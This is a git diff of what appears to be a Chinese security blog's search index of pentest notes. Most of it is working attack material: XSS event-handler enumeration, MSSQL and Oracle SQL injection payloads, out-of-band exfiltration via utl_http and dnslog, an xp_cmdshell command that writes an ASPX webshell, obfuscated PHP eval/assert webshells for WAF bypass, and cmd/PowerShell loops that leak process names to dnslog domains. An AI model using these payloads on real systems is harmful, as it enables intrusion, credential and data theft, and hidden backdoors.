@@ -2051,6 +2051,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onclick</span><br><span class="line">onauxclick</span><br><span class="line">ondblclick</span><br><span class="line">ondrag</span><br><span class="line">ondragend</span><br><span class="line">ondragenter</span><br><span class="line">ondragexit</span><br><span class="line">ondragleave</span><br><span class="line">ondragover</span><br><span class="line">ondragstart</span><br><span class="line">onmousedown</span><br><span class="line">onmouseenter</span><br><span class="line">onmouseleave</span><br><span class="line">onmousemove</span><br><span class="line">onmouseout</span><br><span class="line">onmouseover</span><br><span class="line">onmouseup</span><br></pre></td></tr></table></figure>
 
 <p>测试其余组件可以使用前面已经讨论过的方法。</p>
+<h5 id="如何获取这些on属性的标签"><a href="#如何获取这些on属性的标签" class="headerlink" title="如何获取这些on属性的标签"></a>如何获取这些on属性的标签</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前端遍历BOM对象document的属性即可</span><br><span class="line"></span><br><span class="line">let results &#x3D; []</span><br><span class="line">for (let i in document)&#123;</span><br><span class="line">  if(i.startsWith(&quot;on&quot;))&#123;</span><br><span class="line">    results.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(results)</span><br><span class="line">localStorage.onAttrs&#x3D;JSON.stringify(results)</span><br><span class="line">因为results字符串非常长，会在chrome控制台会被截断，所以把它存到localStorage中，结果在 Chrome devtool -&gt; Application -&gt; Storage 中可以找到。</span><br></pre></td></tr></table></figure>
+
+
+
 <h5 id="难控制的"><a href="#难控制的" class="headerlink" title="难控制的"></a><strong>难控制的</strong></h5><p>当输入显示在无法与之交互的标签内时，需要使用标签本身来执行payload。这种情况的payload方案是：</p>
 <p><code>{quote}&gt;{any payload scheme from html context section}</code></p>
 <p><a href="https://xz.aliyun.com/t/7406" target="_blank" rel="noopener">填充符探索</a></p>
@@ -3121,6 +3125,10 @@
 <p>id=1;Exec(‘WA’+’ITFOR DELAY ‘’0:0:5’’’)</p>
 <p>id=1;declare @test nvarchar(50);set @test=’wait’+’for delay ‘’0:0:5’’’;exec sp_executesql @test</p>
 <h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>1、首先填充方式：MSSQL可以看出来<strong>%00-%20的填充符号</strong>、<strong>注释符号</strong>、<strong>特殊符号交集</strong>在这些中间是通用的，先fuzz这些通用符号（00-20,2a,2f,2e,3a），如果都不行，那么ASP可能首先没办法绕过（因为位置二的关系）。aspx再针对每个位置去fuzz。</p>
+<h2 id="五-PHP绕过"><a href="#五-PHP绕过" class="headerlink" title="五 PHP绕过"></a>五 PHP绕过</h2><h3 id="1-php-宝塔"><a href="#1-php-宝塔" class="headerlink" title="1 php+宝塔"></a>1 php+宝塔</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php ev&#39;.&#39;al($_PO&#39;.&#39;ST[x]?)&gt; 相当于&lt;?php eval($_POST[x])?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模拟预处理用于数据库不支持预编译机制的情况，其本质是在底层先对用户输入进行转义后，再对SQL语句进行拼接，然后将完整的语句发送给数据库执行。任何可控的拼接都是具有一定危险性的，在PHP 5.3.6前，这种转义是通过单字节字符集来完成的，因此存在宽字节注入。但在正确设置字符集的前提下，不可否认这种方式是可以防止SQL注入的。</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
   <entry>
@@ -3756,96 +3764,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Orancle注入总结/1</title>
-    <url>/2021/01/29/Orancle%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    Orancle数据库常用于一些大型公司，通常都配合Java后端来使用。 现在所在的公司平时测试中也会惊颤刚看到Oracle注入的漏洞，所以总结一下注入的过程，从如何发现注入点到数据的获取。  之后希望能从注入点中拿到shell。</p>
-<h2 id="0x02-正片"><a href="#0x02-正片" class="headerlink" title="0x02 正片"></a>0x02 正片</h2><h3 id="第一步、-寻找并判断注入点"><a href="#第一步、-寻找并判断注入点" class="headerlink" title="第一步、 寻找并判断注入点"></a>第一步、 寻找并判断注入点</h3><h4 id="注意：-避免使用and-1-1这样的语句"><a href="#注意：-避免使用and-1-1这样的语句" class="headerlink" title="注意： 避免使用and 1=1这样的语句"></a>注意： 避免使用<code>and 1=1</code>这样的语句</h4><h5 id="数字型："><a href="#数字型：" class="headerlink" title="数字型："></a>数字型：</h5><p>数字型的注入和其他数据库时一样，构造<strong>加减乘除</strong>的条件来判断注入。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过 &lt;&gt; 来判断 相当于!&#x3D;</span><br><span class="line"></span><br><span class="line">?id&#x3D;1+and+1&lt;&gt;6--+ #返回为真 页面正常</span><br><span class="line">?id&#x3D;1+and+1&lt;&gt;1--+ #返回为假 页面异常</span><br><span class="line"></span><br><span class="line">#通过 加减法来判断</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回id,为1的内容</span><br><span class="line">?id&#x3D;2-1  #返回为1的内容</span><br><span class="line"></span><br><span class="line">#通过数据库报错来判断</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1&#x2F;0 #返回异常</span><br><span class="line"></span><br><span class="line"># 通过注释符来判断(多行注释:&#x2F;**&#x2F;,单行注释:--)</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1&#x2F;*v1rus*&#x2F; #也返回正常</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1--v1rus #也返回正常</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="字符型："><a href="#字符型：" class="headerlink" title="字符型："></a>字符型：</h5><p>字符型的注入和mysql差不多，存在闭合引用符号的问题，后续用单行注释解决剩下的单引号。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过&lt;&gt;来判断</span><br><span class="line"></span><br><span class="line">?name&#x3D;loecho&#39;+and+1&lt;&gt;6--+ #返回正常</span><br><span class="line">?name&#x3D;loecho&#39;+and+1&lt;&gt;1--+ #返回异常</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#使用字符串拼接符’||’，通过判断拼接符是否执行，从而判断是否存在注入</span><br><span class="line"></span><br><span class="line">?name&#x3D;lo&#39;||&#39;echo #返回正常    &#39;||user||&#39;</span><br><span class="line">?name&#x3D;lo&#39;||&#39;haha #返回异常</span><br></pre></td></tr></table></figure>
-
-<h3 id="第二步、-利用并查询数据"><a href="#第二步、-利用并查询数据" class="headerlink" title="第二步、 利用并查询数据"></a>第二步、 利用并查询数据</h3><p><strong><em>有回显的情况：</em></strong></p>
-<h4 id="1、-联合查询"><a href="#1、-联合查询" class="headerlink" title="1、 联合查询"></a>1、 联合查询</h4><p><strong>即利用union select将想要查询的数据显示在页面上</strong>，构造正常语句，成功执行SQL语句查询数据</p>
-<ul>
-<li>具体步骤如下:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 01.先判断列数,同Mysql一样</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;+order+by+4--+ #返回正常</span><br><span class="line">?id&#x3D;1&#39;+order+by+5--+ #提示报错</span><br><span class="line"></span><br><span class="line">得出结论数据为: 5 列</span><br><span class="line"></span><br><span class="line"># 02.然后对每一列的数据类型进行判断（可以使用null代替某些无法快速猜测出数据类型的位置），先默认每一列均为null，然后从第一列开始依次将null改为字符串，如果报错则说明该列是数字型，否则则是字符型。,同Mysql一样</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;+union+select+user+null+null+null+from+dual--+ #查询当前用户名</span><br><span class="line">以此类推</span><br><span class="line"></span><br><span class="line"># 03. 利用select table_name from user_tables where rownum&#x3D;1获取表名（列名table数据同理）：</span><br><span class="line"></span><br><span class="line">select column_name from user_tab_columns where table_name&#x3D;&#39;TB_USER&#39; and rownum&#x3D;1（获取列名）</span><br><span class="line">select USER_ID from TB_USER where USER_ID&#x3D;1 and rownum&#x3D;1（获取数据）</span><br></pre></td></tr></table></figure>
-
-<h4 id="2、-报错注入"><a href="#2、-报错注入" class="headerlink" title="2、 报错注入"></a>2、 报错注入</h4><p><strong>构造报错语句，通过数据库报错来带出我们要查询的数据</strong>，常用的报错函数包括（upper函数大写转小写）</p>
-<ul>
-<li>XMLType()</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询语句</span><br><span class="line"></span><br><span class="line">upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62)))</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>dbms_xdb_version.checkin()</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询语句</span><br><span class="line"></span><br><span class="line">upper(dbms_xdb_version.checkin((select user from dual)))</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>ctxsys.drithsx.sn()</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">upper(dbms_xdb_version.checkin((select user from dual)))</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>ordsys.ord_dicom.getmappingxpath()</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">ordsys.ord_dicom.getmappingxpath(user,user,user)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>dbms_utility.sqlid_to_sqlhash()</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">dbms_utility.sqlid_to_sqlhash((select user from dual))</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong><em>无回显的情况：</em></strong></p>
-<h4 id="1、-oob外带数据（nc监听）"><a href="#1、-oob外带数据（nc监听）" class="headerlink" title="1、 oob外带数据（nc监听）"></a>1、 oob外带数据（nc监听）</h4><p>通过HTTP请求,或者DNSlog,来构造语句,如果目标出网,并且对数据库函数没有进行限制,就会实现攻击</p>
-<ul>
-<li>HTTP 请求外带数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;||(select banner from sys.v_$version where rownum&#x3D;1))&#x3D;1--  查询指纹版</span><br><span class="line"></span><br><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;%7C%7C(select SYS_CONTEXT (&#39;USERENV&#39;, &#39;CURRENT_USER&#39;)from dual))&#x3D;1 -- 查询环境</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and%20 utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;%7c%7c (select user from dual))&#x3D;1-- 查询当前用户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and%20%20utl_http.request(%27http:&#x2F;&#x2F;ip:port&#x2F;%27%7c%7c(select%20instance_name%20from%20v$instance))&#x3D;1--查询具体内容</span><br><span class="line"></span><br><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;||(select TABLE_NAME from all_tables where rownum&#x3D;1))&#x3D;1-- 查询所有数据表名</span><br><span class="line"></span><br><span class="line">select name from v$database;</span><br><span class="line"></span><br><span class="line">select instance_name from v$instance;</span><br><span class="line"></span><br><span class="line">1.查询所有数据库</span><br><span class="line"></span><br><span class="line">由于Oralce没有库名,只有表空间,所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询。</span><br><span class="line">select * from v$tablespace;--查询表空间(需要一定权限)</span><br><span class="line"></span><br><span class="line">2.查询当前数据库中所有表名</span><br><span class="line"></span><br><span class="line">select * from user_tables;</span><br><span class="line"></span><br><span class="line">3.查询指定表中的所有字段名</span><br><span class="line"></span><br><span class="line">select column_name from user_tab_columns where table_name &#x3D; &#39;table_name&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.查询指定表中的所有字段名和字段类型</span><br><span class="line"></span><br><span class="line">select column_name, data_type from user_tab_columns where table_name &#x3D; &#39;table_name&#39;;   &#x2F;&#x2F;具体的话加 and rownum &#x3D;  1</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DSNlog请求外带数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- UTL_HTTP.REQUEST</span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;) FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line">- DBMS_LDAP.INIT</span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;,80) FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- HTTPURITYPE </span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT HTTPURITYPE((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;).GETCLOB() FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- UTL_INADDR.GET_HOST_ADDRESS </span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;) FROM sys.DUAL;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2、-基于布尔值的盲注"><a href="#2、-基于布尔值的盲注" class="headerlink" title="2、 基于布尔值的盲注"></a>2、 基于布尔值的盲注</h4><p>通过<strong>构造不同条件（正确or错误）</strong>,<strong>返回相应页面的不同</strong>,就形成了Bool值的注入</p>
-<ul>
-<li>通过 substr() decode() 函数的盲注(常用)</li>
-</ul>
-<p>先介绍一下decode的用法简化了if</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">decode(条件,值1,返回值1,值2,返回值2,...值n,返回值n,缺省值)    值1 就返回1</span><br><span class="line">decode(字段或字段的运算，值1，值2，值3）  条件为值几就返回几</span><br><span class="line"></span><br><span class="line">栗子：</span><br><span class="line">select decode(性别，男，1，0），decode(性别，女，1，0） from students 返回男女生的数量。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符:</span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select+decode(substr((select user from dual),§1§,1),&#39;§S§&#39;,(1),0) from dual)--+ #查 user</span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select decode(substr((select banner from sys.v_$version wher rownum&#x3D;1),1 ,1),&#39;S&#39;,(1),0) from dual)--+ # 查version </span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select decode(substr((select table_name from user_tables where rownum&#x3D;1),§1§,1),&#39;§S§&#39;,(1),0) from dual)--+ # 查表名</span><br><span class="line"></span><br><span class="line">总结就是decode判断处用substr阶段出select返回的字符爆破。</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>通过 case、substr()、ascii() 函数的盲注</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):</span><br><span class="line">  123&#x3D;(case when ascii(substr(user,§0§,1))&#x3D;§121§ then &#39;123&#39; else &#39;456&#39; end)--+</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>通过 case、instr()、chr() 函数的盲注</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:所有可见字符的ASCII码(32~126): 第二个,第三个为:值相同为截取位数</span><br><span class="line">123&#x3D;(case instr(user,chr(§*§),§*§,1) when §*§ then &#39;123&#39; else &#39;456&#39; end)--+</span><br></pre></td></tr></table></figure>
-
-<p>后面这两个完全可以不用ascii、instr函数直接判断字符，这样做的目的也就是方便写脚本。还有其他方式来利用,配合函数,不同环境不同用法，但是用脚本爆破盲注其实远不如用外带数据通道来做。</p>
-<h4 id="3、-基于时间的盲注"><a href="#3、-基于时间的盲注" class="headerlink" title="3、 基于时间的盲注"></a>3、 基于时间的盲注</h4><p>时间盲注，<strong>基于服务器返回所用的时间，判断函数是否执行，从而判断是否存在注入</strong></p>
-<ul>
-<li>Decode()、DBMS_PIPE.receive_message()、chr()、substr()利用</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):</span><br><span class="line">&#39;||decode(substr(user,§*§,1),chr(§*§),DBMS_PIPE.receive_message(&#39;sen&#39;,1),2)||&#39; #查user</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.cnblogs.com/-qing-/p/10951998.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10951998.html</a> 详细的时间盲注，从权限和耗时角度考虑，耗时上也可以运用到笛卡尔积。</p>
-<h2 id="0x03-后话思路"><a href="#0x03-后话思路" class="headerlink" title="0x03 后话思路"></a>0x03 后话思路</h2><p>1、 实际测试过程中，与网站交互或存在注入的概率不是很大。着重测试一些微应用的后端或者后端的api。所以在搜索处，表单的提交处，各种与后台交互的细小的点都可以测试。</p>
-<p>2、 只要自己成功判断后端执行了我们拼接的sql语句。就是存在问题，配合数据库特性1/0也是可以的。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>任意文件读取/1</title>
     <url>/2021/02/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/1/</url>
     <content><![CDATA[<h1 id="1-利用指南"><a href="#1-利用指南" class="headerlink" title="1. 利用指南"></a>1. 利用指南</h1><p>基本思路就是尝试读取敏感文件以获取尽可能多的信息。<br>比如， <code>/etc/issue</code> 可以确认 Linux 主机的发行版，<br>其中 <code>.bash_history</code>, <code>ssh相关路径</code> 中可能含有大量敏感信息，<br>获取到 <code>/etc/shadow</code> 则可以直接使用 John The Ripper 尝试枚举 root 密码。<br>Tomcat 控制台可读取用户密码 <code>/usr/local/tomcat/conf/tomcat-users.xml</code>。</p>
@@ -4074,7 +3992,7 @@
 <h4 id="2、-forName函数的重载"><a href="#2、-forName函数的重载" class="headerlink" title="2、 forName函数的重载"></a>2、 forName函数的重载</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className);</span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line">Class.forName(className,<span class="keyword">true</span>,currentLoader)</span><br></pre></td></tr></table></figure>
 
 <p>​    第一个可以理解为第二种方式的封装。默认情况下，第一个参数是类名（String，完整路径）；第二个参数代表是否初始化（static块里面的代码）；第三个参数是ClassLoader。</p>
-<p><img src="/2021/03/01/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/1/E:%5Cblog%5Csource_posts%5Cjava%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%5Cimage-20210302093902149.png" alt="image-20210302093902149"></p>
+<p><img src="/2021/03/01/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/1/.%5Cimage-20210302093902149.png" alt="image-20210302093902149"></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> obfuscate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticClass</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">"Dynamic-Block-executed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StaticClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Constructor-executed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">"Static-executed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​    使⽤功能”.class”来创建Class对象的引⽤时，不会⾃动初始化该Class对象，因为这不算反射，这个算是获得它的java.lang.Class对象，直接拿它的属性。其实在forName的时候，构造函数并不会执行，即使我们设置initialize=true。这个初始化要理解为类的初始化，所以执行的是静态代码块。这是我构造的内部类。</p>
@@ -4158,7 +4076,7 @@
 <p>官方将<code>java.rmi.server.useCodebaseOnly</code>的默认值由<code>false</code>改为了<code>true</code>。在配置为<code>true</code>的情况下，Java虚拟机将只信任预先配置好的<code>codebase</code>，不再支持从RMI请求中获取。</p>
 <h3 id="十四、-CommonsBeanutils与无commons-collections的Shiro反序列化利用"><a href="#十四、-CommonsBeanutils与无commons-collections的Shiro反序列化利用" class="headerlink" title="十四、 CommonsBeanutils与无commons-collections的Shiro反序列化利用"></a>十四、 CommonsBeanutils与无commons-collections的Shiro反序列化利用</h3><p><code>commons-beanutils</code>中提供了一个<strong>静态方法</strong>，PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，除此之外， PropertyUtils.getProperty 还支持<strong>递归</strong>获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code>的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在<strong>不确定JavaBean是哪个类对象时使用</strong>。 【某些类是动态生成的子类？】</p>
 <p>【我看了一下这个BeanComparator中传入了一个ComparableComparator对象，这个对象是存在于CommonsCollections-3.2.1的包中，那么可以用CBS的链是不是也可以用CC链】</p>
-<p><img src="/2021/03/01/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/1/E:%5Cblog%5Csource%5C_posts%5Cjava%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%5Cimage-20210420110443664.png" alt="image-20210420110443664"></p>
+<p><img src="/2021/03/01/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/1/image-20210420110443664.png" alt="image-20210420110443664"></p>
 ]]></content>
   </entry>
   <entry>
@@ -4239,6 +4157,16 @@
 <p>2、sqlmap中的os-shell参数是利用xp_cmdshell通过cmd.exe执行的命令，cmd和powershell默认代码页为936（简体中文GBK），而sqlmap默认是以UTF-8提交的数据包，所以会乱码。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;1;DECLARE @clit VARCHAR(8000);SET @clit&#x3D;0x6563686f205e3c25402050616765204c616e67756167653d224a73637269707422255e3e5e3c25256576616c28526571756573742e4974656d5b2278787861736563225d2c22756e7361666522293b255e3e203e20433a5c696e65747075625c777777726f6f745ce4b8ade69687e6b58be8af955c7368656c6c322e61737078;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @clit--</span><br></pre></td></tr></table></figure>
 
+
+
+<h3 id="利用dnslog探测目标主机杀软"><a href="#利用dnslog探测目标主机杀软" class="headerlink" title="利用dnslog探测目标主机杀软"></a>利用dnslog探测目标主机杀软</h3><p><strong>0x02 利用cmdshell for循环实现</strong></p>
+<p>两种方法原理一样，都是先获取目标主机的进程，然后通过for、ForEach循环Ping dnslog外带出来。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;F %i in (&#39;wmic process get Name ^| findstr &quot;.exe&quot;&#39;) do ping -n 1 %i.******.dnslog.cn &gt;nul</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x03 利用powershell foreach循环实现</strong></p>
+<p>以下命令是@Twe1ve老哥整出来的，加了个去重，但是在实际测试过程中发现好像并没有起到去重效果。最后别忘了删除一下1.txt文件！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;Get-Process | select processname &gt; 1.txt&quot;</span><br><span class="line">powershell -c &quot;Get-Content .\1.txt | Sort-Object -Unique | ForEach-Object &#123;if($_ -match $regex)&#123;$b&#x3D;$_.trim();ping -n 1 $b&#39;.***fks2j.ns.dns3.cf.&#39;&#125; &#125;&quot;</span><br><span class="line"></span><br><span class="line">powershell -c &quot;Get-Process | select processname &gt; 1.txt | Get-Content .\1.txt | Sort-Object -Unique | ForEach-Object &#123;if($_ -match $regex)&#123;$b&#x3D;$_.trim();ping -n 1 $b&#39;.***fks2j.ns.dns3.cf.&#39;&#125; &#125;&quot;</span><br><span class="line"></span><br><span class="line">powershell -c &quot;Get-Process | select processname &gt; 1.txt | Get-Content .\1.txt | Sort-Object -Unique | ForEach-Object &#123;if($_ -match $regex)&#123;$b&#x3D;$_.trim();echo $b&#125; &#125;&quot;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
   <entry>
@@ -4252,21 +4180,31 @@
 
 <p>使用方法：<br>?peciwid=95277&amp;cftmid=id</p>
 <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php连接密码均为1</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a=end($_REQUEST);</span><br><span class="line"><span class="keyword">eval</span>($a); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = substr_replace(<span class="string">"asse00"</span>,<span class="string">"rt"</span>,<span class="number">4</span>);</span><br><span class="line">$b=<span class="keyword">array</span>($array=<span class="keyword">array</span>(<span class="string">''</span>=&gt;$a($_GET[<span class="string">'1'</span>])));</span><br><span class="line">var_dump($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="comment">/**   </span></span><br><span class="line"><span class="comment">    * assert($_GET[1+0]);</span></span><br><span class="line"><span class="comment">    */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; &#125;  </span><br><span class="line">    $user = <span class="keyword">new</span> ReflectionClass(<span class="string">'User'</span>);</span><br><span class="line">    $comment = $user-&gt;getDocComment();</span><br><span class="line">    $d = substr($comment , <span class="number">14</span> , <span class="number">20</span>);</span><br><span class="line">    assert($d);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span><span class="string">' v. N&amp; N- O&amp; ]; v9 N! m9 y: &#123;; J</span></span><br><span class="line"><span class="string">$_=('</span>%<span class="number">01</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">13</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">13</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">05</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">12</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">14</span><span class="string">'^'</span>`<span class="string">'); // $_='</span>assert<span class="string">';</span></span><br><span class="line"><span class="string">$__='</span>_<span class="string">'.('</span>%<span class="number">0</span>D<span class="string">'^'</span>]<span class="string">').('</span>%<span class="number">2</span>F<span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">0</span>E<span class="string">'^'</span>]<span class="string">').('</span>%<span class="number">09</span><span class="string">'^'</span>]<span class="string">'); // $__='</span>_POST<span class="string">';</span></span><br><span class="line"><span class="string">$___=$$__;</span></span><br><span class="line"><span class="string">$_($___[pwd]); // assert($_POST[_]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
-  </entry>
-  <entry>
-    <title>java/1/1</title>
-    <url>/2021/03/20/java/1/1/</url>
-    <content><![CDATA[]]></content>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a=end($_REQUEST);</span><br><span class="line"><span class="keyword">eval</span>($a); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = substr_replace(<span class="string">"asse00"</span>,<span class="string">"rt"</span>,<span class="number">4</span>);</span><br><span class="line">$b=<span class="keyword">array</span>($array=<span class="keyword">array</span>(<span class="string">''</span>=&gt;$a($_GET[<span class="string">'1'</span>])));</span><br><span class="line">var_dump($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="comment">/**   </span></span><br><span class="line"><span class="comment">    * assert($_GET[1+0]);</span></span><br><span class="line"><span class="comment">    */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; &#125;  </span><br><span class="line">    $user = <span class="keyword">new</span> ReflectionClass(<span class="string">'User'</span>);</span><br><span class="line">    $comment = $user-&gt;getDocComment();</span><br><span class="line">    $d = substr($comment , <span class="number">14</span> , <span class="number">20</span>);</span><br><span class="line">    assert($d);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span><span class="string">' v. N&amp; N- O&amp; ]; v9 N! m9 y: &#123;; J</span></span><br><span class="line"><span class="string">$_=('</span>%<span class="number">01</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">13</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">13</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">05</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">12</span><span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">14</span><span class="string">'^'</span>`<span class="string">'); // $_='</span>assert<span class="string">';</span></span><br><span class="line"><span class="string">$__='</span>_<span class="string">'.('</span>%<span 